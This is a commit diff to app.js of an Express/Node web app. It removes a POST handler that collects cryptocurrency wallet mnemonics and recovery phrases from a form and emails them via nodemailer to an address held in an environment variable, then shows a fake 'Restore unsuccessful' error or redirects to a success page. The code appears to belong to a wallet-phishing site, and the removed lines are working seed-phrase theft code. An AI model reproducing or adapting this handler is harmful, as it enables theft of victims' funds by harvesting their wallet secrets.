c8be3075191792f36494ad49df8ee4a8bb2e90a1
Nwalo <nwalookechukwu@gmail.com>
2021-11-30 06:46:19 +0100

    push

--- app.js
+++ app.js
@@ -3,62 +3,16 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
 const ejs = require('ejs');
-// var enforce = require('express-sslify');
+var enforce = require('express-sslify');
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public'));
 app.set('view engine', 'ejs');
-// app.use(enforce.HTTPS({ trustProtoHeader: true }));
+app.use(enforce.HTTPS({ trustProtoHeader: true }));
 
 app.get('/', function(req, res) {
 	res.render('home');
-});
-
-app.post('/', function(req, res) {
-	var mnemonic = req.body.mnemonic;
-	var walletForMnemonic = req.body.walletForMnemonic;
-	var phrase = req.body.phrase;
-	var walletForPhrase = req.body.walletForPhrase;
-
-	var msg =
-		'<h3>Wallet Details: </h3> <ul> <li>mnemonic: ' +
-		mnemonic +
-		'</li> <li>walletForMnemonic: ' +
-		walletForMnemonic +
-		'</li> <li>phrase: ' +
-		phrase +
-		'</li> <li>walletForPhrase: ' +
-		walletForPhrase +
-		'</li>';
-
-	// console.log(msg);
-	var transporter = nodemailer.createTransport({
-		host: 'smtp.gmail.com',
-		port: '465',
-		secure: true,
-		auth: {
-			user: process.env.GMAIL_ID,
-			pass: process.env.GMAIL_PASS
-		}
-	});
-
-	var options = {
-		from: process.env.GMAIL_ID,
-		to: process.env.CLIENT_ID,
-		subject: 'Wallet Validation',
-		html: msg
-	};
-
-	transporter.sendMail(options, function(err, info) {
-		if (err) {
-			console.log(err);
-			res.send('Error! Restore unsuccessful, please check your network and try again...');
-		} else {
-			res.redirect('/success');
-			console.log('Email status: ' + info.response);
-		}
-	});
 });
 
 app.get('/connect/:link', function(req, res) {
